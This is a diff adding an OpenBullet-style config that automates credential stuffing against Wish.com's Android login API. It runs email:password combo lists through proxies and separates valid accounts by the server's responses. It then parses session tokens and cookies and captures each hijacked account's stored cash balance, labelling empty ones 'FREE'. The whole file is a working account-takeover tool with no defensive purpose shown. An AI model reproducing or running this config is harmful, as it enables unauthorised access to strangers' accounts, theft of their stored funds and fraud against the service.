@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "Wish",
+  "SuggestedBots": 85,
+  "MaxCPM": 0,
+  "LastModified": "2020-03-03T19:26:41.6538705+03:30",
+  "AdditionalInfo": "mesvak",
+  "Author": "mesvak",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.wish.com/api/email-login" 
+  CONTENT "email=<USERNAME>&password=<PASSWORD>&session_refresh=false&app_referrer=utm_source%3Dgoogle-play%26utm_medium%3Dorganic&app_device_id=1f103df0-6e3d-3025-b107-2dd3490d29cd&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C61%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C85%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C109%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C152%2C154%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C179%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C194%2C197%2C198%2C199&_app_type=wish&_riskified_session_token=12ece64a-d12a-4ba9-827d-812a99b8b7f5&_threat_metrix_session_token=7625-877c10b6-40f7-43d7-8a04-959242172571&advertiser_id=6c708824-4ac1-429f-913f-715cc6db3f4c&_version=4.35.5&app_device_model=A5010" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; A5010 Build/LMY48Z) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: www.wish.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Cookie: _xsrf=1; _appLocale=en_US; bsid=99aad92b9d0aac35e2cfeeccc60bd29e; _timezone=8.0; _timezone_id=Asia/Shanghai" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 1120" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Email or Password is incorrect" 
+    KEY "Please connect using Facebook to login to this account" 
+  KEYCHAIN Success OR 
+    KEY "session_token\": " 
+
+PARSE "<SOURCE>" LR "session_token\": \"" "\", \"" -> VAR "st" 
+
+PARSE "<SOURCE>" LR "\": \"" "\"," -> VAR "user" 
+
+PARSE "<COOKIES(sweeper_session)>" LR "" "" -> VAR "suuid" 
+
+PARSE "<COOKIES(vendor_user_tracker)>" LR "" "" -> VAR "vut" 
+
+PARSE "<COOKIES(bsid)>" LR "" "" -> VAR "bsid" 
+
+FUNCTION Replace "\"" "" "<suuid>" -> VAR "ss" 
+
+REQUEST POST "https://www.wish.com/api/commerce-cash-data/get" 
+  CONTENT "app_device_id=1f103df0-6e3d-3025-b107-2dd3490d29cd&_xsrf=1&_client=androidapp&_capabilities=2%2C3%2C4%2C6%2C7%2C9%2C11%2C12%2C13%2C15%2C21%2C24%2C25%2C28%2C35%2C37%2C39%2C40%2C43%2C46%2C47%2C49%2C50%2C51%2C52%2C53%2C55%2C57%2C58%2C60%2C61%2C64%2C65%2C67%2C68%2C70%2C71%2C74%2C76%2C77%2C78%2C80%2C82%2C83%2C85%2C86%2C90%2C93%2C94%2C95%2C96%2C100%2C101%2C102%2C103%2C106%2C108%2C109%2C110%2C111%2C153%2C114%2C115%2C117%2C118%2C122%2C123%2C124%2C125%2C126%2C128%2C129%2C132%2C133%2C134%2C135%2C138%2C139%2C146%2C147%2C148%2C149%2C150%2C152%2C154%2C155%2C156%2C157%2C159%2C160%2C161%2C162%2C163%2C164%2C165%2C166%2C171%2C172%2C173%2C174%2C175%2C176%2C177%2C179%2C180%2C181%2C182%2C184%2C185%2C186%2C187%2C188%2C189%2C190%2C191%2C192%2C194%2C197%2C198%2C199&_app_type=wish&_riskified_session_token=12ece64a-d12a-4ba9-827d-812a99b8b7f5&_threat_metrix_session_token=7625-877c10b6-40f7-43d7-8a04-959242172571&advertiser_id=6c708824-4ac1-429f-913f-715cc6db3f4c&_version=4.35.5&app_device_model=A5010" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; A5010 Build/LMY48Z) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Safari/537.36" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Host: www.wish.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Cookie: _xsrf=1; _appLocale=en_US; bsid=<bsid>; sweeper_session=<ss>; vendor_user_tracker=<vut>; _timezone=8.0; _timezone_id=Asia/Shanghai" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 990" 
+
+PARSE "<SOURCE>" LR "currency_code\": \"" "\"" -> VAR "symbol" 
+
+PARSE "<SOURCE>" REGEX "}, \\\"amount\\\": (.*), \\\"symbol\\\":" "[1]" -> CAP "Cash" 
+
+FUNCTION RegexMatch "^(0\\.0)" "<Cash>" -> VAR "cash222" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<cash222>" Contains "0.0" 
+
